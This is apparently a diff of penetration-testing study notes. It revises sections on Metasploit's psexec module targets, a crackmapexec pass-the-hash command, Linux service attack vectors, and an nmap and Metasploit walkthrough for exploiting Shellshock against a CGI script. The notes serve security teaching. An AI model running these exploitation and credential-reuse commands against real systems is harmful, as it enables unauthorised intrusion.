@@ -1486,7 +1486,7 @@ exploit
 
 This exploit uses SMB to gain remote code execution, there's different methods for delivering and executing the payload on the target system. If you're having problems with getting a meterpreter session on the target through the exploit, you might need to tweak the target for the exploit.  In the Metasploit `exploit/windows/smb/psexec` module, the `target` setting determines the method used to deliver and execute the payload on the target system. The available options here include:
 - **Automatic**: Adapts to the target system by checking for PowerShell availability and choosing the most appropriate method (PowerShell or Native Upload) accordingly.
-- **PowerShell**:  Uses Powershell commands to execute the payload directly in memory. This doesn't check without verifying Powershell being available on the target.
+- **PowerShell**:  Uses Powershell commands to execute the payload directly in memory. This doesn't check if PowerShell is available on the target.
 - **Native Upload**: This method uploads the payload as an executable file to a writable directory on the target system (by default, the `SYSTEM32` directory) and then executes it.
 So if the default target (Automatic) doesn't work, we can try set the target as Native upload  to have the  meterpreter payload uploaded to the target. Try running the exploit again after the changes.
 ```
@@ -1512,13 +1512,11 @@ crackmapexec smb target -u Administrator -H "5f4dcc3b5aa765d61d8327deb882cf99" -
 
 # Linux-Vulnerabilities
 
-
-Linux is a free and open-source operating system made up of the **Linux kernel**, developed by Linus Torvalds, and the **GNU toolkit** (cat ls cd dir), initiated by Richard Stallman. Often referred to as **GNU/Linux**, it is commonly used as a server OS, with services and protocols running that can serve as access vectors for attackers. 
-- **Apache Web Server** | TCP ports 80/443 | Free and open source cross-platform web server which accounts for over 80% of web servers globally.
-- **SSH (Secure Shell)** |TCP ports 22 |  SSH is a cryptographic remote access protocol that is used to remotely access and control systems over an unsecured network. SSH was developed as a secure successor to telnet.
-- **FTP (File Transfer Protocol)** | TCP port 21 | The protocol is used to facilitate file sharing between a server and client/clients and vice versa.
-- **SAMBA** | TCP port 445 |  Samba is the Linux implementation of SMB  and allows Windows systems to access Linux shares and devices.
-
+Linux is a free and open-source operating system composed of the **Linux kernel**, developed by Linus Torvalds, and the **GNU toolchain**, initiated by Richard Stallman. The GNU toolchain includes essential utilities like `cat`, `ls`, `cd`, and `dir`. **GNU/Linux** refers to an operating system that combines the Linux kernel and GNU components, commonly used as a server operating system hosting various services and protocols. The following services can potentially be exploited as access vectors by attackers:
+- **Apache HTTP Server** | TCP ports 80/443 | A free and open-source cross-platform web server that serves web content over HTTP and HTTPS.
+- **SSH (Secure Shell)** | TCP port 22 | A cryptographic protocol used for secure remote access and control over an unsecured network, developed as a secure successor to Telnet.
+- **FTP (File Transfer Protocol)** | TCP port 21 | A protocol used to facilitate file sharing between a server and client(s).
+- **Samba** | TCP port 445 | An open-source implementation of the SMB/CIFS protocol that allows interoperability between Linux/Unix servers and Windows clients for file and print services.
 
 # Exploiting-Linux-Vulnerabilities
 
@@ -1547,7 +1545,7 @@ However, visibility in the page source is not necessary for discovery.  Tools li
 
 ###### 2. Check if the system is vulnerable to ShellShock
 
-We can use the nmap script `http-shellshock` to check if the target is vulnerable to it. We also need to provide the arguments for the script 
+We can use the nmap script `http-shellshock` to check if the target is vulnerable to it. We also need to provide the `http-shellshock.uri`argument for the script which is the location of the CGI script.
 ```
 nmap -sV target --script=http-shellshock --script-args "http-shellshock.uri"=<loc_of_cgi_script>
 ```
@@ -1619,29 +1617,18 @@ As a result, the attacker can send commands to the shell over the network (via s
 
 #### Performing the Exploit using Metasploit
 
-1. Start Postgresql and open Metasploit (`msfconsole)
+There will be an auxiliary scanner for shellshock which checks for the vulnerability (`auxiliary/scanner/http/apache_mod_cgi_bash_env`) we can just go with the exploit module (`exploit/multi/http/apache_mod_cgi_bash_env_exec`). You'll likely need to setup the `RHOST` for the target and the `TARGETURI` for the cgi script location.
 ```
 service postgresql start && msfconsole
-```
-2. Search for Shellshock
-```
-search shellshock
-```
-There will be an auxiliary scanner for shellshock which checks for the vulnerability (`auxiliary/scanner/http/apache_mod_cgi_bash_env`) we can just go with the exploit module (`exploit/multi/http/apache_mod_cgi_bash_env_exec`)
-```
-use exploit/multi/http/apache_mod_cgi_bash_env_exec
-```
-3. Configure and rune the exploit: You'll likely need to setup the `RHOST` for the target and the `TARGETURI` for the cgi script location.
-```
-set RHOST 10.55.21.43
 
+### (OPTIONAL) search shellshock ###
+
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+set RHOST 10.55.21.43
 set TARGETURI /test.cgi
-```
-4. Run the exploit: This should setup a meterpreter session
-```
 exploit
 ```
-
+	
 
 ## FTP
 
